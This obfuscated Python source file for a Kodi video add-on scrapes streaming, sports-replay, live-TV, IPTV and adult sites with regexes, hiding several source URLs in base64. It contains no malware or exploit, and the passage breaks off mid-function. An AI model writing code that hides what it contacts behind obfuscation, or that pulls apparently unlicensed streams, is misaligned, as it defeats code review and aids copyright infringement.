  if 80 - 80: OoooooooOO + OoO0O0
  if 95 - 95: O0o0Ooo / OoIii111II * O0o0Ooo - OoooooooOO * OoooooooOO % Ooo00oOo00o
class iI1 ( ) :
 if 12 - 12: O0o0Ooo + iii11 + Ooo0OO0oOO . OoO0O0 / ii11i1
 List = [ ]
 source_list = [ ]
 def __init__ ( self , name ) :
  if 29 - 29: OoO0O0 . o0Oo0O0Oo00oO - OoOoOO00
  i111I11i1I = name
  self . Get_Sources ( iI1i11 , i111I11i1I )
  if 68 - 68: iIii1I11I1II1 + OoOoOO00 / OoIii111II
  if 91 - 91: I1IiI % iIii1I11I1II1 . OOOo0
 def Get_Sources ( self , URL , season_name ) :
  Oo0oO0ooo = xbmcgui . DialogProgress ( )
  OoOO = ooOOO0 ( URL )
  o0o = re . compile ( '<td>.+?<a href="/link/(.+?)".+?height="16px">(.+?)\n' , re . DOTALL ) . findall ( OoOO )
  for iI1i11 , OO in o0o :
   URL = 'http://www.watchseries.li/link/' + iI1i11
   self . Get_site_link ( URL , season_name )
   if 70 - 70: Ooo0OO0oOO % OoOoOO00 % O0 . i1IIi / O0o0Ooo
 def Get_site_link ( self , url , season_name ) :
  OoOO = ooOOO0 ( url )
  o0o = re . compile ( '<iframe style=.+?" src="(.+?)"' ) . findall ( OoOO )
  oo000 = re . compile ( '<IFRAME SRC="(.+?)"' ) . findall ( OoOO )
  Ooo0oO0 = re . compile ( '<IFRAME style=".+?" SRC="(.+?)"' ) . findall ( OoOO )
  for url in o0o :
   self . main ( url , season_name )
  for url in oo000 :
   self . main ( url , season_name )
  for url in Ooo0oO0 :
   self . main ( url , season_name )
   if 100 - 100: ii11ii1ii * i11iIiiIii % OoIii111II / Oo / o0Oo0O0Oo00oO + ii11ii1ii
 def main ( self , url , season_name ) :
  Oo0oO0ooo . create ( "[COLORwhite]Origin[/COLOR]" , "Getting Sources" , '' , 'Please Wait' )
  if 'daclips.in' in url :
   o00ooOoo = 'DACLIPS'
   if o00ooOoo in iI1 . source_list :
    pass
   else :
    self . daclips ( url , season_name , o00ooOoo )
    Oo0oO0ooo . update ( 0 , "" , "Getting Daclips Links" )
  else :
   if 'filehoot.com' in url :
    o00ooOoo = 'FILEHOOT'
    if o00ooOoo in iI1 . source_list :
     pass
    else :
     Oo0oO0ooo . update ( 0 , "" , "Getting Filehoot Links" )
     self . filehoot ( url , season_name , o00ooOoo )
   else :
    if 'thevideo.me' in url :
     o00ooOoo = 'THEVIDEO'
     if o00ooOoo in iI1 . source_list :
      pass
     else :
      self . thevideo ( url , season_name , o00ooOoo )
      Oo0oO0ooo . update ( 0 , "" , "Getting Thevideo Links" )
    else :
     if 'allmyvideos.net' in url :
      o00ooOoo = 'ALLMYVIDEOS'
      if o00ooOoo in iI1 . source_list :
       pass
      else :
       self . allmyvid ( url , season_name , o00ooOoo )
       Oo0oO0ooo . update ( 0 , "" , "Getting Allmyvideo Links" )
     else :
      if 'vidspot.net' in url :
       o00ooOoo = 'VIDSPOT'
       if o00ooOoo in iI1 . source_list :
        pass
       else :
        self . vidspot ( url , season_name , o00ooOoo )
        Oo0oO0ooo . update ( 0 , "" , "Getting Vidspot Links" )
      else :
       if 'vodlocker' in url :
        o00ooOoo = 'VODLOCKER'
        if o00ooOoo in iI1 . source_list :
         pass
        else :
         self . vodlocker ( url , season_name , o00ooOoo )
         Oo0oO0ooo . update ( 0 , "" , "Getting Vodlocker Links" )
         if 5 - 5: OoO0O0
         if 84 - 84: OoOoOO00 * OoIii111II * OoOoOO00 % OoO0O0 / OOOo0
 def allmyvid ( self , url , season_name , source_name ) :
  OoOO = ooOOO0 ( url )
  o0o = re . compile ( '"file" : "(.+?)",\n.+?"default" : .+?,\n.+?"label" : "(.+?)"' , re . DOTALL ) . findall ( OoOO )
  for O0Oooo , OO in o0o :
   self . Printer ( O0Oooo , season_name , source_name )
   if 27 - 27: o0Oo0O0Oo00oO + i11iIiiIii * Ooo0OO0oOO + I1IiI + oo0OO
 def vidspot ( self , url , season_name , source_name ) :
  OoOO = ooOOO0 ( url )
  o0o = re . compile ( '"file" : "(.+?)",\n.+?"default" : .+?,\n.+?"label" : "(.+?)"' ) . findall ( OoOO )
  for O0Oooo , OO in o0o :
   self . Printer ( O0Oooo , season_name , source_name )
   if 87 - 87: O0
 def thevideo ( self , url , season_name , source_name ) :
  OoOO = ooOOO0 ( url )
  o0o = re . compile ( "{ label: '.+?', file: '(.+?)' }" ) . findall ( OoOO )
  for O0Oooo in o0o :
   self . Printer ( O0Oooo , season_name , source_name )
   if 87 - 87: OOooOOo / OoOoOO00
 def vodlocker ( self , url , season_name , source_name ) :
  OoOO = ooOOO0 ( url )
  o0o = re . compile ( 'file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( OoOO )
  for O0Oooo in o0o :
   self . Printer ( O0Oooo , season_name , source_name )
   if 90 - 90: o0Oo0O0Oo00oO - ii11ii1ii - O0 + ii11i1
 def daclips ( self , url , season_name , source_name ) :
  OoOO = ooOOO0 ( url )
  o0o = re . compile ( '{ file: "(.+?)", type:"video" }' ) . findall ( OoOO )
  for O0Oooo in o0o :
   self . Printer ( O0Oooo , season_name , source_name )
   if 68 - 68: iii11 . Oo % o0Oo0O0Oo00oO - OoooooooOO * oo0OO . iii11
 def filehoot ( self , url , season_name , source_name ) :
  OoOO = ooOOO0 ( url )
  o0o = re . compile ( 'file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( OoOO )
  for O0Oooo in o0o :
   self . Printer ( O0Oooo , season_name , source_name )
   if 46 - 46: i11iIiiIii - iii11 * OOOo0 * Ooo0OO0oOO % ii11ii1ii * i1IIi
 def Printer ( self , Link , season_name , source_name ) :
  if 5 - 5: O0 / o0Oo0O0Oo00oO . Oo + OoooooooOO
  if Link in iI1 . List :
   pass
  elif source_name in iI1 . source_list :
   pass
  else :
   oOO0OO0OO ( '[COLORgreen]' + source_name + '[/COLOR]' , Link , 10012 , ii11iIi1I + 'WATCHSERIES.png' )
   Oo0oO0ooo . update ( 100 , "" , "Got Source" )
   iI1 . List . append ( Link )
   iI1 . source_list . append ( source_name )
   if 97 - 97: OoO0O0 . ii11i1 . ii11i1 / iIii1I11I1II1 - Ooo00oOo00o + oo0OO
   xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
   if 32 - 32: iii11 . OOooOOo % OoO0O0 + ii11ii1ii + Ooo00oOo00o
   if 76 - 76: Ooo00oOo00o - i11iIiiIii + I1IiI + iii11 / OoooooooOO
   if 50 - 50: OoOoOO00 - O0o0Ooo + iIii1I11I1II1 + iIii1I11I1II1
   if 91 - 91: OoOoOO00 - O0 . iIii1I11I1II1 . O0 + ii11ii1ii - OoOoOO00
   if 26 - 26: OOooOOo
def IiIi ( ) :
 ooOooo000oOO ( '[COLORgreen]Highlights[/COLOR]' , '' , 10008 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Fixtures[/COLOR]' , '' , 10009 , ii11iIi1I + 'ORIGINFOOTBALL.png' , i1iiIII111ii , '' )
 if 88 - 88: I1IiI - iii11
def o0oo0O0oOoooO ( ) :
 iIIiiI1II1i11 = ooOOO0 ( i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20vcXVpY2tpbmRleC5odG1s' ) )
 o0o = re . compile ( '<a target="_self" href="(.+?)".+?src="(.+?)" alt="(.+?)"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , o0O0o0 , OO in o0o :
  ooOooo000oOO ( '[COLORgreen]' + ( OO ) . replace ( 'amp;' , '' ) + '[/COLOR]' , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20v' ) + iI1i11 , 10010 , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20v' ) + o0O0o0 , i1iiIII111ii , '' )
  if 70 - 70: OoIii111II * OoIii111II + Oo * iii11 % OOOo0 + iIii1I11I1II1
def i1oOOO0ooOO ( url ) :
 OoOO = ooOOO0 ( url )
 ii = re . compile ( 'AndClearL.+?><h2.+?head>(.*?)float' , re . DOTALL ) . findall ( OoOO )
 for ii in ii :
  i11IiI1iiI11 = re . compile ( '(.*?)</h2>' ) . findall ( str ( ii ) )
  for OOoOOOO00 in i11IiI1iiI11 :
   OOoOOOO00 = OOoOOOO00
  IIii1III = re . compile ( 'comp_head>(.*?)</span>.*?<div class = fLeft width = ".*?"><img src="(.*?)">.*?</div>.*?ST:(.*?)</div>(.+?)<!-- around all of channel types ENDS 2-->' , re . DOTALL ) . findall ( str ( ii ) )
  for ooooOoo0OO , o0O0o0 , time , Oo0 in IIii1III :
   ooo00Ooo = re . compile ( ",CAPTION, '(.+?)&nbsp" ) . findall ( Oo0 )
   ooOooo000oOO ( '[COLORgreen]' + OOoOOOO00 + ' - ' + ooooOoo0OO + ' - ' + time + '[/COLOR]' , '' , 10010 , i1111 ( 'aHR0cDovL2xpdmVvbnNhdC5jb20=' ) + o0O0o0 , i1iiIII111ii , ( str ( ooo00Ooo ) ) )
   if 96 - 96: Ooo0OO0oOO % ii11i1 % OoIii111II * Ooo0OO0oOO / iii11
 Oo0OoO00oOO0o ( 'tvshows' , 'Media Info 3' )
 if 13 - 13: iIii1I11I1II1 - Ooo00oOo00o
def ooo0 ( ) :
 if 36 - 36: oo0OO
 ooOooo000oOO ( '[COLORgreen]Shows[/COLOR]' , 'http://www.fullmatchesandshows.com/category/show/' , 10011 , 'http://www.fm-base.co.uk/forum/attachments/club-competition-logos/3885-soccer-am-logo-socceram.png' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]Premier League[/COLOR]' , 'http://www.fullmatchesandshows.com/premier-league/' , 10011 , 'https://footballseasons.files.wordpress.com/2013/05/premier-league.png' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]La Liga[/COLOR]' , 'http://www.fullmatchesandshows.com/la-liga/' , 10011 , 'http://1.bp.blogspot.com/-c6kQ40ryhyo/U19cUlz25sI/AAAAAAAABak/qtn5chSFZm0/s1600/la-liga-logo_display_image.png' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]Bundesliga[/COLOR]' , 'http://www.fullmatchesandshows.com/bundesliga/' , 10011 , 'http://m.img.brothersoft.com/iphone/189/518670189_icon175x175.jpg' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]Champions League[/COLOR]' , 'http://www.fullmatchesandshows.com/champions-league/' , 10011 , 'http://www.ecursuri.ro/images/teste/test-champions-league.jpg' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]Serie A[/COLOR]' , 'http://www.fullmatchesandshows.com/category/serie-a/' , 10011 , 'http://files.jcriccione.it/200000223-2484526782/serie%20a.png' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]Ligue 1[/COLOR]' , 'http://www.fullmatchesandshows.com/category/ligue-1/' , 10011 , 'http://a1.mzstatic.com/us/r30/Purple5/v4/37/c7/44/37c744ae-5824-42b7-6ce0-5f471f52baab/icon180x180.jpeg' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]Copa America 2015[/COLOR]' , 'http://www.fullmatchesandshows.com/copa-america-2015/' , 10011 , 'https://pbs.twimg.com/profile_images/521966985907691520/Nq9OAPIo_400x400.png' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]CONCACAF[/COLOR]' , 'http://www.fullmatchesandshows.com/category/concacaf/' , 10011 , 'http://a3.mzstatic.com/us/r30/Purple3/v4/40/26/14/4026147c-7022-4ca3-504e-e78950cc3f1c/icon175x175.png' , ii11iIi1I + 'fanart.jpg' , '' )
 ooOooo000oOO ( '[COLORgreen]Women World Cup[/COLOR]' , 'http://www.fullmatchesandshows.com/category/women-world-cup/' , 10011 , 'https://upload.wikimedia.org/wikipedia/en/thumb/7/76/2015_FIFA_Women\'s_World_Cup_logo.svg/967px-2015_FIFA_Women\'s_World_Cup_logo.svg.png' , ii11iIi1I + 'fanart.jpg' , '' )
 if 90 - 90: O0
def Iii ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( 'itemprop="image" class="entry-thumb" src="(.+?)".+?<h3 itemprop="name" class="entry-title td-module-title"><a itemprop="url" href="(.+?)" rel="bookmark" title=".+?">(.+?)</a></h3>' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , url , OO in o0o :
  i1iI111II1ii = OO . replace ( '&#8211;' , '-' ) . replace ( '&#038;' , '&' )
  oOO0OO0OO ( '[COLORgreen]' + i1iI111II1ii + '[/COLOR]' , url , 10013 , o0O0o0 )
  if 62 - 62: oo0OO * iIii1I11I1II1 . OoO0O0 - OoooooooOO * OoOoOO00
def IiIIi1II1i ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<script data-config="(.+?)" data-height' ) . findall ( OoOO )
 for o0000oO in o0o :
  ooO0OOo0 = ( o0000oO ) . replace ( '/v2' , '' ) . replace ( 'zeus.json' , 'video-sd.mp4?hosting_id=21772' ) . replace ( 'config.playwire.com' , 'cdn.video.playwire.com' )
  Ooo0 ( 'http:' + ooO0OOo0 )
  if 43 - 43: Ooo00oOo00o % Ooo00oOo00o
  if 46 - 46: Oo % iIii1I11I1II1 . oo0OO . O0 * o0Oo0O0Oo00oO / OoooooooOO
def II1iI1IIi ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<a href="([^"]*)" title="([^"]*)"><img itemprop="image" content="([^"]*)"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( "<a rel='next' href=([^=]*)=" , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , OO , o0O0o0 in o0o :
  oOO0OO0OO ( OO , url , 8046 , o0O0o0 )
 for url in oo000 :
  ooOO00oOOo000 ( 'NEXT PAGE' , ( url ) . replace ( ' class' , '' ) , 8045 , ii11iIi1I + 'Next.png' )
def Ii11iiI1 ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( "__filename='([^']*)',.+?__fullimage='([^']*)',.+?__title='([^']*)'," , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , o0O0o0 , OO in o0o :
  Ooo0 ( 'http://bitcast-b.bitgravity.com/ndtvod/23372/ndtv/' + url )
  if 71 - 71: OOooOOo / iii11 % iii11
def OoooO0 ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( "src='http://www.youtube.com/embed/(.+?)?version=3&#038;rel=1&#038;fs=1&#038;autohide=2&#038;showsearch=0&#038;showinfo=1&#038;iv_load_policy=1&#038;wmode=transparent' frameborder='0' allowfullscreen='true'></iframe>" ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  yt . PlayVideo ( url )
  if 75 - 75: o0Oo0O0Oo00oO
def iI1ii1Ii ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL3RvcGRvY3VtZW50YXJ5ZmlsbXMuY29tLw==' ) )
 o0o = re . compile ( '<a href="(.+?)" >(.+?)</a></li><li>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( OO , iI1i11 , 8041 , ii11iIi1I + 'documentary.png' )
def OooOOOoOoo0O0 ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<h2><a href="(.+?)" title="(.+?)">.+?</a></h2>.+?src="(.+?)"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( 'class="inactive">.+?</a><a href="(.+?)">Next</a></div>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , OO , o0O0o0 in o0o :
  ooOO00oOOo000 ( ( OO ) . replace ( '&#039;s' , '' ) , url , 8042 , o0O0o0 )
 for url in oo000 :
  ooOO00oOOo000 ( 'NEXT PAGE' , url , 8041 , ii11iIi1I + 'Next.png' )
  if 81 - 81: OoO0O0 - OOooOOo - Oo - ii11i1 / iii11 % Ooo0OO0oOO
  if 52 - 52: ii11ii1ii / oo0OO
def i1ii1IIIII ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<meta itemprop="name" content="(.+?)".+?<meta itemprop="thumbnailUrl" content="(.+?)".+?<meta itemprop="embedUrl" content="(.+?)".+?<meta itemprop="description" content="(.+?)" />' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( '<div class="video new-video"><iframe width="766" height="431" src="(.+?)&iv_load_policy=3&showinfo=0&autohide=1"' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for OO , o0O0o0 , url , OO0oOOo0o in o0o :
  oOO0OO0OO ( ( OO ) . replace ( '&#039;s' , '' ) , url . replace ( 'https://www.youtube.com/embed/' , '' ) , 8043 , o0O0o0 )
 for url in oo000 :
  oOOO0Iii1i11iiI1 ( ( url ) . replace ( '//' , 'http://' ) )
  if 95 - 95: OoIii111II * iIii1I11I1II1 + ii11ii1ii
def oOOO0Iii1i11iiI1 ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<link rel="canonical" href="(.+?)">  <link rel="stylesheet"' ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  oOO0OO0OO ( 'PLAY' , ( url ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , ii11iIi1I + 'documentary.png' )
  if 5 - 5: Oo
def o0oOo00 ( ) :
 OoOO = o0o0 ( 'http://www.stream2watch.co/live-tv' )
 o0o = re . compile ( '<a href="(.+?)">.+?<img src="(.+?)" alt=".+?"/>.+?<span class="country_name">(.+?)<br />(.+?)</span>' , re . DOTALL ) . findall ( OoOO )
 for iI1i11 , o0O0o0 , OO , IiI1III in o0o :
  ooOO00oOOo000 ( ( OO + '[COLORgreen]' + IiI1III + '[/COLOR]' ) , iI1i11 , 8086 , o0O0o0 )
  if 91 - 91: Ooo0OO0oOO + ii11i1 - I1IiI - Ooo00oOo00o + OoO0O0
def IIiII111I ( url ) :
 OoOO = o0o0 ( url )
 o0o = re . compile ( '<a class="front_channel_href" href="(.+?)" title=".+?">.+?<img class="front_channel_thumb" src="(.+?)" alt=".+?"/>.+?<span class="front_channel_name">(.+?)</span>' , re . DOTALL ) . findall ( OoOO )
 for url , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , url , 8087 , o0O0o0 )
  if 87 - 87: ii11i1 - ii11ii1ii % ii11ii1ii . OoIii111II / ii11ii1ii
def II1i ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( 'a id="code_.+?data-f-href="(.+?)" data-code-embed="">(.+?)</a>' , re . DOTALL ) . findall ( OoOO )
 for url , OO in o0o :
  o0II1IIi1iII1i ( url , OO )
  if 26 - 26: O0
def o0II1IIi1iII1i ( url , name ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( "playStream\('.+?', '(.+?)'\);" , re . DOTALL ) . findall ( OoOO )
 for url in o0o :
  print url
  oOO0OO0OO ( '[COLORgreen]' + name + '[/COLOR]' , url , 222 , '' )
  if 17 - 17: OoOoOO00
def iiIiii ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL3d3dy5zb2xpZS5vcmcvYWxpYnJhcnkvaW5kZXguaHRtbA==' ) )
 o0o = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + iI1i11 , 3002 , 'http://www.solie.org/alibrary/' + o0O0o0 )
def iiI1ii ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , o0O0o0 , OO in o0o :
  ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3003 , 'http://www.solie.org/alibrary/' + o0O0o0 )
def O0OooOO ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<br><a href="([^"]*)">(.+?)</a>' ) . findall ( iIIiiI1II1i11 )
 i1i1 = re . compile ( 'href="([^"]*)">Season(.+?)</a>' ) . findall ( iIIiiI1II1i11 )
 next = re . compile ( '<a href="([^"]*)">Episodes</a>' ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( '<td align="center" valign="top">.+?<a href="(.+?)">.+?<img src="(.+?)".+?<H3>(.+?)</H3>' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  oOO0OO0OO ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3004 , ii11iIi1I + 'classicmovies.png' )
 for url , OO in i1i1 :
  ooOO00oOOo000 ( '[COLORgreen]Season- ' + OO + '[/COLOR]' , 'http://www.solie.org/alibrary/' + url , 3003 , ii11iIi1I + 'classicmovies.png' )
 for url in next :
  ooOO00oOOo000 ( '[COLORgreen]NEXT[/COLOR]' , 'http://www.solie.org/alibrary/' + url , 3003 , ii11iIi1I + 'Next.png' )
 for url , o0O0o0 , OO in oo000 :
  ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '</TD>' , '' ) . replace ( '<BR>' , ' ' ) . replace ( '</H3>' , '' ) . replace ( '/<br>' , ' ' ) . replace ( '</a>' , '' ) . replace ( '<br>' , '' ) . replace ( '<H3>' , '' ) , 'http://www.solie.org/alibrary/' + url , 3003 , 'http://www.solie.org/alibrary/' + o0O0o0 )
def o0oOoOo0 ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<iframe.+?src="([^"]*)"' ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  III1IiI1i1i ( url )
def III1IiI1i1i ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<meta property="og:video" content="([^"]*)"/>' ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  Ooo0 ( url )
  if 94 - 94: oo0OO - Oo + OoIii111II
def O0oooOoO ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL3JldHJvdmlzaW9uLnR2L2FsbC8=' ) )
 o0o = re . compile ( '<a href="([^"]*)"><h2><font color=".+?"><h2>(.+?)</font></h2></a>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  oOO0OO0OO ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '&#8211;' , ':' ) , iI1i11 , 8061 , ii11iIi1I + 'classicmovies.png' )
def O0Oo0 ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( "v.src = '([^']*)';" ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  Ooo0 ( url )
  if 46 - 46: OOOo0 * I1IiI
def oOoO00O000 ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL3JldHJvdmlzaW9uLnR2L2NsYXNzaWMtdHYv' ) )
 o0o = re . compile ( '<a href="([^"]*)"><h2><font color=".+?"><h2>(.+?)</font></h2></a>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  oOO0OO0OO ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '&#8211;' , ':' ) , iI1i11 , 8061 , ii11iIi1I + 'classictv.png' )
def Ooo000O00 ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( "v.src = '([^']*)';" ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  Ooo0 ( url )
  if 36 - 36: iii11 % i11iIiiIii
def Iiii1Ii ( ) :
 OoOO = ooOOO0 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vbTN1c3RyZWFtcw==' ) )
 o0o = re . compile ( '<li><a href="(.+?)"> (.+?).m3u</a></li>' ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '-' , ' ' ) . replace ( '_' , ' ' ) , ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vbTN1c3RyZWFtcy8=' ) ) + iI1i11 , 8071 , ii11iIi1I + 'streams.png' )
def ooOOo00oo0 ( url ) :
 OoOO = o0o0 ( url )
 o0o = re . compile ( 'EXTINF:.+?,(.+?)\n(.+?)\n#' , re . DOTALL ) . findall ( OoOO )
 for OO , url in o0o :
  oOO0OO0OO ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '_' , ' ' ) , ( url ) . strip ( ) , 404 , ii11iIi1I + 'streams.png' )
def IIIII1Ii ( url ) :
 OoOO = o0o0 ( url )
 o0o = re . compile ( 'EXTINF:(.+?),(.+?)\n(.+?)\n#' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , OO , url in o0o :
  url = ( ( i1111 ( 'aHR0cDovL3BpZXN1c3R2Lm5ldDo4MDAwL2xpdmUv' ) ) + oO0o0o0ooO0oO + '/' + oo0o0O00 + url ) . strip ( )
  oOO0OO0OO ( ( '[COLORgreen]' + OO + '[/COLOR]' ) . replace ( '_' , ' ' ) , url , 10012 , o0O0o0 )
  if 13 - 13: OoOoOO00
def o0o000Oo ( ) :
 iIi1IiI ( 'Best Videos' , 'http://www.xvideos.com/best' , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 iIi1IiI ( 'Genres' , 'http://www.xvideos.com' , 10106 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 iIi1IiI ( 'Recently Uploaded' , 'http://xvideos.com' , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 iIi1IiI ( 'Tags' , 'http://www.xvideos.com/tags' , 10103 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 iIi1IiI ( 'Search' , '' , 10107 , ii11iIi1I + 'JIZBOX.png' , '' , '' , )
 if 57 - 57: OoIii111II * O0 * O0o0Ooo
def I1II1 ( url ) :
 OoOO = ooOOO0 ( url )
 oOOoo = re . compile ( '<li><a class=".+?".+?href="(.+?)">Next</a></li>' ) . findall ( OoOO )
 for url in oOOoo :
  iIi1IiI ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10103 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
 o0o = re . compile ( '<li><a href="(.+?)"><b>(.+?)</b><span class="navbadge default"(.+?)</span>' ) . findall ( OoOO )
 for url , OO , iiiiI in o0o :
  iIi1IiI ( OO + ' - No of Videos : ' + ( iiiiI ) . replace ( '>' , '' ) , 'http://www.xvideos.com' + url , 10105 , ii11iIi1I + 'JIZBOX.png' , '' , '' )
  if 9 - 9: Ooo0OO0oOO . Ooo00oOo00o * i1IIi . OoooooooOO
def II1OoooOo ( url ) :
 OoOO = ooOOO0 ( url )
 oOOoo = re . compile ( 'href="([^"]*)">Next</a></li>' ) . findall ( OoOO )
 for url in oOOoo :
  iIi1IiI ( '[COLORred]NEXT[/COLOR]' , 'http://www.xvideos.com' + url , 10104 , ii11iIi1I + 'Next.png' , '' , '' )
 o0o = re . compile ( ':"([^"]*)".+?;</script></a></div></div><p class="profile-name"><a href="([^"]*)">(.+?)</a></p><p class="profile-counts">\n(.+?)\n' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , url , OO , I1I1IIiiii1ii in o0o :
  iIi1IiI ( OO + '--' + I1I1IIiiii1ii , 'http://www.xvideos.com' + url + '#_tabVideos,videos-best' , 10105 , ( o0O0o0 ) . replace ( 'http:\/\/' , 'http://' ) , '' , '' )
  if 92 - 92: OoIii111II / iii11 . ii11ii1ii
  if 30 - 30: ii11i1 . ii11ii1ii / iii11
def i1II11IiiiI ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<div class="thumb-inside"><script>.+?<img src="(.+?)".+?<a href="(.+?)" title=".+?">(.+?)</a></p>.+?uration">(.+?)</span>.+?Porn quality:(.+?)</span>' , re . DOTALL ) . findall ( OoOO )
 for o0O0o0 , url , OO , OoOOoooOO0O , IIIi in o0o :
  Ii1iIiII1ii1 ( OO + ' - Porn Quality : ' + IIIi + ' - ' + OoOOoooOO0O , 'http://www.xvideos.com' + url , 10108 , o0O0o0 , o0O0o0 , IIIi + ' - ' + OoOOoooOO0O )
 Ii1iiI1 = re . compile ( '<li><a href="([^"]*)" class="no-page">Next</a></li></ul></div>' ) . findall ( OoOO )
 for url in Ii1iiI1 :
